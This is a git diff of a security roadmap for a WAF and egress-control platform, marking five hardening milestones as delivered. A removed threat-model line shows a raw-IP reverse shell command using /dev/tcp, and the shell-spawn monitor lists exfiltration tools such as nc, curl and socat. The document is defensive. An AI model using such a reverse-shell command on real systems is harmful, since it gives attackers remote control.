@@ -18,11 +18,11 @@ Every item is tracked strictly by **implementation status (`✅ Delivered`, `�
 | Phase | Lock / Module | Status | Priority | Codebase Scope | Core Security & GreenOps Gain |
 | :--- | :--- | :---: | :---: | :--- | :--- |
 | **v1 Base** | **Ingress WAF, PHP2Shell VP, Pure BFF & RAPL Cockpit** | **✅ Delivered** | **v1 Core** | `gate-proxy`, `backend`, `telemetry-agent`, `web` | `< 1.5 ms` idle edge PEP, HTTP `413` (`32 KB`), `100%` PHP2Shell mitigation (`0%` app CPU), OIDC Pure BFF & live CSRD RAPL PDF/CSV |
-| **P0/P1** | **#1 Strict Egress Network Confinement** | **⏳ Planned** | **P0 (Critical)** | `docker-compose*.yml`, `egress-gateway`, eBPF | Blocks raw-IP TCP reverse shells bypassing DNS (`internal: true` bridge + `cgroup/connect4`) |
-| **P0/P1** | **#2 Multi-Encoding Normalization (Base64 / HTML)** | **🚧 Partial** | **P1 (High)** | `apps/gate-proxy/src/engine/canonicalizer.ts` | Recursive 3-pass URL & SQL `/*...*/` canonicalization **done**; adds auto Base64/Hex/HTML decoding |
-| **P0/P1** | **#3 Volumetric Rate-Limiting & Auto IP Quarantine** | **🚧 Partial** | **P1 (High)** | `apps/gate-proxy/src/quarantine/ip-reputation.ts` | Persistent SOC blacklist **done**; adds sliding-window rate limits (`60 req/10s`) & auto-jail (`< 0.1 ms` drop) |
-| **P0/P1** | **#4 HTTP Protocol Hardening (`431`) & Shell-Spawn Watch** | **🚧 Partial** | **P1 (High)** | `apps/gate-proxy/src/`, `apps/telemetry-agent` | `PHP2Shell` & `HTTP 413` **done**; adds strict `431` header caps (`8 KB`), RFC multipart validation & runtime `/bin/sh` spawn alerts |
-| **P0/P1** | **#5 Continuous Passive Posture, PQC (`ML-KEM`) & Remediation** | **🚧 Partial** | **P1 (High)** | `apps/backend/internal/scanner/` | Go passive scanner, **PQC `X25519MLKEM768` (FIPS 203)** probe + TLS snippets & CVE Feed **done**; adds scheduled cron audits |
+| **P0/P1** | **#1 Strict Egress Network Confinement & DNS-to-IP Allowlist** | **✅ Delivered (v1.2)** | **P0 (Critical)** | `docker-compose*.yml`, `egress-gateway`, `deploy/security/` | Blocks raw-IP TCP reverse shells bypassing DNS (`internal: true` bridge, `DnsToIpAllowlist` 60s TTL + `egress-lockdown.nft`) |
+| **P0/P1** | **#2 Multi-Encoding Normalization (Base64 / HTML / Hex)** | **✅ Delivered (v1.2)** | **P1 (High)** | `apps/gate-proxy/src/engine/canonicalizer.ts`, `sandboxEngine.ts` | Recursive 3-pass URL, HTML entities, Hex/Unicode escapes, path normalization (`/./`, `//`, `\`) & auto Base64 payload decoding (`>= 16` chars) |
+| **P0/P1** | **#3 Volumetric Rate-Limiting (`429`) & Auto-Jail IP Quarantine** | **✅ Delivered (v1.2)** | **P1 (High)** | `apps/gate-proxy/src/quarantine/ip-reputation.ts`, `backend` | Persistent SOC blacklist + sliding-window rate limits (`60 req/10s`, `HTTP 429`) & 15-min Auto-Jail (`3` critical offenses in `5 min`) |
+| **P0/P1** | **#4 HTTP Protocol Hardening (`431`), Multipart RFC & Shell-Spawn Watch** | **✅ Delivered (v1.2)** | **P1 (High)** | `apps/gate-proxy/src/`, `apps/telemetry-agent/src/collector/` | Strict `HTTP 431` header caps (`8 KB` total / `4 KB` single / `64` max), RFC multipart validation, compression-bomb block & Rust `/proc` shell-spawn monitor |
+| **P0/P1** | **#5 Continuous Passive Posture, PQC (`ML-KEM`), CERT-FR & Remediation** | **✅ Delivered (v1.2)** | **P1 (High)** | `apps/backend/internal/scanner/`, `service/audit_service.go`, `web` | Scheduled periodic audits (`6h`/`12h`/`24h`), posture drift detection, guided Traefik/Nginx/Caddy/PHP snippets, PQC `X25519MLKEM768` & CVSS-weighted scoring |
 | **P2** | **#6 L3/L4 eBPF / XDP Kernel Filter & CVE Audit** | **⏳ In Design** | **P2 (Medium)** | `apps/telemetry-agent/src/` | NIC-level `XDP_DROP` (`< 0.005 ms`) against malformed TCP SYN options (LSRR/SSRR) + `uname -r` alerts |
 | **P2** | **#7 Enterprise DNS Filtering & Shadow IT (DoH/DoT)** | **⏳ Planned** | **P2 (Medium)** | `apps/egress-gateway/src/` | Central DHCP/`:5053` + remote DoH/DoT resolver regulating RAT tools (TeamViewer, AnyDesk, RustDesk) in Prod/DMZ |
 | **P2** | **#8 Frugal Rust Endpoint Agent (`< 10 MB`) & PQC `mTLS`** | **⏳ In Design** | **P2 (Medium)** | New `aegis-node-agent` (Rust) + `web` | Cross-platform workstation CVE & hygiene probe over **hybrid post-quantum `mTLS` (`X25519MLKEM768`)** + conditional access |
@@ -33,9 +33,9 @@ Every item is tracked strictly by **implementation status (`✅ Delivered`, `�
 
 ---
 
-## ✅ v1 / v1.1 Baseline Delivered (Currently Verified in Codebase)
+## ✅ v1 / v1.1 / v1.2 Baseline Delivered (Currently Verified in Codebase)
 
-Before listing upcoming locks, the following capabilities are **already implemented and verified** in production Docker compositions:
+Before listing upcoming P2/P3 locks, the following capabilities are **already implemented and verified** in production Docker compositions:
 
 | Pillar | Verified Codebase Implementation | Proven Benchmark / Evidence |
 | :--- | :--- | :--- |
@@ -47,64 +47,48 @@ Before listing upcoming locks, the following capabilities are **already implemen
 
 ---
 
-## 🔥 Phase P0 / P1 — Edge, Egress & Continuous Posture Hardening
+## 🔥 Phase P0 / P1 — Edge, Egress & Continuous Posture Hardening (✅ Delivered in v1.2.0)
 
-### 🔒 Lock #1: Strict Egress Network Confinement (Anti-Raw-IP Reverse Shell)
-- **Status:** ⏳ Planned
+### 🔒 Lock #1: Strict Egress Network Confinement & DNS-to-IP Allowlist (Anti-Raw-IP Reverse Shell)
+- **Status:** ✅ Delivered (`v1.2.0`)
 - **Priority:** Critical (**P0**) — Prerequisite before multi-tenant untrusted workload exposure
 - **Security Gain:** Jumps from `0%` to `~98%` neutralization on direct raw-IP socket callbacks (`connect()` without DNS)
-- **Current Codebase Gap:**
-  [`apps/egress-gateway`](apps/egress-gateway/src/index.ts) intercepts UDP/TCP DNS queries (`:5053`) and explicit HTTP checks. However, in [`docker-compose.yml`](docker-compose.yml) (default bridge) and [`docker-compose.dokploy.yml`](docker-compose.dokploy.yml) (`aegis-internal` bridge without `internal: true`), a compromised worker process executing `/bin/sh -i >& /dev/tcp/185.220.101.99/4444` can reach external IPs directly without DNS resolution.
-- **Technical Action Plan:**
-  1. Declare `aegis_internal_sandbox` with `internal: true` in Docker Compose definitions (zero default Internet gateway route).
-  2. Attach backend databases (`aegis_timescaledb`) and application runtimes **exclusively** to `aegis_internal_sandbox`, while dual-homing `aegis_gate_proxy` and `aegis_egress_gateway`.
-  3. Pin container DNS resolution strictly to `egress-gateway:5053`.
-  4. *(Linux Bare-Metal Evolution)*: Attach a kernel-level `cgroup/connect4` (`sys_enter_connect`) eBPF hook allowing outbound sockets **only** toward IPs previously resolved and cleared by `egress-gateway` (60s TTL).
+- **Delivered Implementation:**
+  1. Docker network segmentation in [`docker-compose.yml`](docker-compose.yml) and [`docker-compose.dokploy.yml`](docker-compose.dokploy.yml): isolated `aegis-internal` (`internal: true`) network for `timescaledb`, `web`, and `telemetry-agent`, paired with `aegis-edge` for gateway services.
+  2. Dynamic DNS-to-IP allowlist engine [`apps/egress-gateway/src/engine/ip-allowlist.ts`](apps/egress-gateway/src/engine/ip-allowlist.ts) (`DnsToIpAllowlist` with 60s TTL) integrated into [`evaluator.ts`](apps/egress-gateway/src/engine/evaluator.ts) and [`tcp-server.ts`](apps/egress-gateway/src/http/tcp-server.ts) (`POST /api/v1/egress/verify-connection`), blocking literal-IP callbacks (`RAW_IP_REVERSE_SHELL_BLOCKED`) and unapproved direct-IP sockets (`UNRESOLVED_DIRECT_IP_EGRESS_BLOCKED`).
+  3. Host-level nftables enforcement policy in [`deploy/security/egress-lockdown.nft`](deploy/security/egress-lockdown.nft).
 
 ### 🔒 Lock #2: Multi-Encoding Normalization & Anti-Obfuscation
-- **Status:** 🚧 Partial (`canonicalizeInput` v1 URL/SQL/Null-byte active)
+- **Status:** ✅ Delivered (`v1.2.0`)
 - **Priority:** High (**P1**)
 - **Security Gain:** **+12% to +15%** detection against manual obfuscation and double-encoded evasion vectors
-- **Current Codebase State:**
-  [`canonicalizeInput`](apps/gate-proxy/src/engine/canonicalizer.ts) already executes up to 3 passes of `decodeURIComponent`, strips null bytes (`\0`), removes inline SQL comments (`/*...*/`), and collapses whitespace inside [`WafInspector.inspect`](apps/gate-proxy/src/engine/inspector.ts).
-- **Remaining Technical Action Plan:**
-  1. Decode suspicious Base64 blocks (`> 16` chars), hexadecimal escapes (`\x..`), and HTML/Unicode entities (`&#x...;`, `\u00..`) found inside query strings, headers, and bodies prior to evaluating `ZERODAY_EXPLOIT_REGEX`, `RCE_REGEX`, and `SQLI_REGEX`.
-  2. Normalize path segments (`/./`, `//`, Windows `\`) before `TRAVERSAL_REGEX` inspection.
+- **Delivered Implementation:**
+  1. Multi-layer canonicalization in [`apps/gate-proxy/src/engine/canonicalizer.ts`](apps/gate-proxy/src/engine/canonicalizer.ts) and [`apps/web/src/services/sandboxEngine.ts`](apps/web/src/services/sandboxEngine.ts): 3-pass recursive URL decoding, null-byte stripping, named/decimal/hex HTML entity decoding, Hex/Unicode escapes (`\x..`, `\u....`, `%u....`), and automatic Base64 payload extraction and decoding (`>= 16` chars).
+  2. Strict path separator normalization (`/./`, `//`, Windows `\`) prior to `TRAVERSAL_REGEX` inspection.
 
-### 🔒 Lock #3: Volumetric Rate-Limiting & Automated IP Auto-Quarantine
-- **Status:** 🚧 Partial (`IpReputationManager` SOC blacklist active)
+### 🔒 Lock #3: Volumetric Rate-Limiting & Automated IP Auto-Quarantine (Auto-Jail)
+- **Status:** ✅ Delivered (`v1.2.0`)
 - **Priority:** High (**P1**)
 - **Security Gain:** Neutralizes **99%** of automated fuzzing loops and high-speed credential brute-forcing
-- **Current Codebase State:**
-  [`IpReputationManager`](apps/gate-proxy/src/quarantine/ip-reputation.ts) & [`server.ts`](apps/gate-proxy/src/server.ts) already enforce SOC-synced manual/API IP blacklists. However, triggering a single `403`/`413` does not automatically rate-limit or throttle subsequent burst attempts from the same unbanned source IP.
-- **Remaining Technical Action Plan:**
-  1. Add a sliding-window counter (`60 req / 10s` per IP on dynamic routes) with immediate HTTP `429 Too Many Requests`.
-  2. Implement an automated **Jail threshold**: any unauthenticated IP accumulating `3` critical WAF blocks (`risk_score >= 90`) within `5` minutes enters automated **15-minute quarantine** (`< 0.1 ms` pre-body drop).
-  3. Expose live auto-jail expirations and manual unban controls in the Cockpit UI + `POST /api/v1/dashboard/reset`.
+- **Delivered Implementation:**
+  1. Sliding-window volumetric rate limiter (`60 req / 10s` per IP returning HTTP `429 Too Many Requests` with `Retry-After: 10`) in [`apps/gate-proxy/src/quarantine/ip-reputation.ts`](apps/gate-proxy/src/quarantine/ip-reputation.ts) and [`server.ts`](apps/gate-proxy/src/server.ts).
+  2. **15-minute Auto-Jail**: any unauthenticated IP accumulating `3` critical WAF blocks (`risk_score >= 90`) within `5` minutes enters automated **15-minute quarantine** (`AUTO_JAIL_TEMPORARY_QUARANTINE`), synced to the Go Control Plane (`ttlMinutes` / `expires_at`) and surfaced in the Cockpit Controls view.
 
 ### 🔒 Lock #4: HTTP Protocol Hardening (`431`), Multipart RFC & Shell-Spawn Watch
-- **Status:** 🚧 Partial (`PHP2Shell` Virtual Patch & `HTTP 413 > 32 KB` active)
+- **Status:** ✅ Delivered (`v1.2.0`)
 - **Priority:** High (**P1**)
-- **Current Codebase State:**
-  [`zeroday.rule.ts`](apps/gate-proxy/src/rules/zeroday.rule.ts) and [`inspector.ts`](apps/gate-proxy/src/engine/inspector.ts) already block `CVE-2024-4577` PHP2Shell (`100%` verified) and payloads exceeding `AEGIS_MAX_PAYLOAD_BYTES` (`32 KB`) with `HTTP 413`.
-- **Remaining Technical Action Plan:**
-  1. **Protocol Hardening in `gate-proxy`**: Enforce header budgets (`> 8 KB` total / `> 4 KB` per header returning `HTTP 431`), strict `multipart/form-data` RFC boundary & depth validation (`<= 3` nested boundaries), and chunked/compression-bomb ratio caps.
-  2. **Runtime Shell-Spawn Anomaly Telemetry**: Extend [`apps/telemetry-agent`](apps/telemetry-agent/src/main.rs) (`/proc` process tree inspection) to raise a critical alert if web runtimes (`php-fpm`, `node`, `nginx`) unexpectedly spawn child interpreters (`/bin/sh`, `/bin/bash`, `python`).
+- **Delivered Implementation:**
+  1. **Protocol Hardening in [`inspector.ts`](apps/gate-proxy/src/engine/inspector.ts)**: Enforces header budgets (`> 8 KB` total / `> 4 KB` single header / `> 64` headers returning `HTTP 431 Request Header Fields Too Large`), strict `multipart/form-data` RFC boundary & depth validation (`<= 3` nested boundaries, executable upload extension blocking `.php`, `.phtml`, `.phar`, `.sh`), and multi-encoding compression-bomb chaining mitigation.
+  2. **Runtime Shell-Spawn Anomaly Telemetry**: Rust collector [`apps/telemetry-agent/src/collector/process_spawn.rs`](apps/telemetry-agent/src/collector/process_spawn.rs) scanning `/host/proc` and `/proc` to raise an immediate alert when a web worker (`php-fpm`, `php-cgi`, `node`, `nginx`, `apache2`, `caddy`) spawns a child shell or exfiltration binary (`sh`, `bash`, `nc`, `curl`, `python`, `perl`, `socat`).
 
 ### 🔒 Lock #5: Continuous Passive Posture Monitoring, Post-Quantum Probe (`ML-KEM`) & Guided Remediation
-- **Status:** 🚧 Partial (On-demand Go 1.25 scanner, **Post-Quantum Readiness `X25519MLKEM768` probe**, TLS snippets & CVE Feed active)
+- **Status:** ✅ Delivered (`v1.2.0`)
 - **Priority:** High (**P1**)
-- **Current Codebase State:**
-  [`apps/backend/internal/scanner/engine.go`](apps/backend/internal/scanner/engine.go), [`scanner/pqc.go`](apps/backend/internal/scanner/pqc.go), and [`internal/service/cve_service.go`](apps/backend/internal/service/cve_service.go) already audit target domains for security headers, hierarchical DNS (RFC 7489 DMARC / RFC 7208 SPF), EcoIndex score, known CVEs, and **NIST FIPS 203 `X25519MLKEM768` (`0x11ec`) Post-Quantum TLS 1.3 negotiation** with *Harvest Now, Decrypt Later (HNDL)* risk grading and copy-paste Traefik, Nginx, Caddy, and Go remediation snippets.
-- **Remaining Technical Action Plan:**
-  1. Schedule **periodic continuous background scans** for enrolled tenant domains and alert immediately on regressions (expiring TLS certificates, PQC downgrade, newly exposed headers/ports, drifted EcoIndex grade).
-  2. Expand the **guided copy-paste remediation wizard** inside the Cockpit Diagnostics & CVE Feed views (already delivered for Post-Quantum TLS) to cover all security headers and `php.ini` / Apache directives.
-  3. **Sovereign CERT-FR Ingestion & Continuous Vulnerability Qualification**:
-     - Sovereign on-demand sync connector (and controlled local cron) parsing the official **CERT-FR (ANSSI)** feed with zero data leakage to US third parties and no rate-limited API dependencies.
-     - Immediate labeling of newly ingested, uncurated alerts under **`"Procedure under verification (Aegis Lab)"`** (`PENDING_VERIFICATION`) status, ensuring cryptographic and technical integrity until a formal Virtual Patching rule or host remediation procedure is verified.
-  4. **Composite Security Scoring & Software Vulnerability Weighting (Zero Fake-Positive)**:
-     - Unified global security scoring combining transport headers (HSTS, CSP, X-Frame-Options, nosniff), DNS resilience (SPF/DMARC), and software exposition penalties weighted by CVSS severity (`-15 pts` per CRITICAL CVE, `-10 pts` per HIGH CVE, etc.).
-     - Eliminates misleading "100/100 (A)" scores on domains exposing critical unmitigated vulnerabilities (e.g. PHP-CGI RCE, volumetric buffer overflow, Next.js middleware authorization bypass).
+- **Delivered Implementation:**
+  1. **Scheduled Continuous Background Scans & Drift Detection**: `GET/POST /api/v1/audit/schedule` endpoints in [`audit_service.go`](apps/backend/internal/service/audit_service.go) and [`audit_handler.go`](apps/backend/internal/http/handlers/audit_handler.go) with automatic posture drift evaluation (`EvaluatePostureDrift`) and `6h` / `12h` / `24h` scheduling controls in [`AuditPanel.vue`](apps/web/src/components/soc/actions/AuditPanel.vue).
+  2. **Guided Host Remediation Wizard**: Dynamic copy-paste hardening configurations (`GenerateGuidedRemediationSnippets`) for **Traefik**, **Nginx**, **Caddy**, and **Apache / `php.ini`** covering missing security headers, Post-Quantum TLS 1.3 (`X25519MLKEM768`), and PHP SAPI confinement.
+  3. **Sovereign CERT-FR Ingestion & Continuous Qualification (`PENDING_VERIFICATION`)**: On-demand sync with official CERT-FR (ANSSI) advisories and explicit `"Procedure under verification (Aegis Lab)"` labeling for uncurated advisories.
+  4. **Composite CVSS-Weighted Security Scoring (Zero Fake-Positive)**: Unified scoring combining transport headers, DNS resilience, and CVSS-weighted CVE penalties (`-25 pts` per unmitigated CRITICAL CVE, capping domain score at `65/100` when critical vulnerabilities are exposed).
 
 ---
 
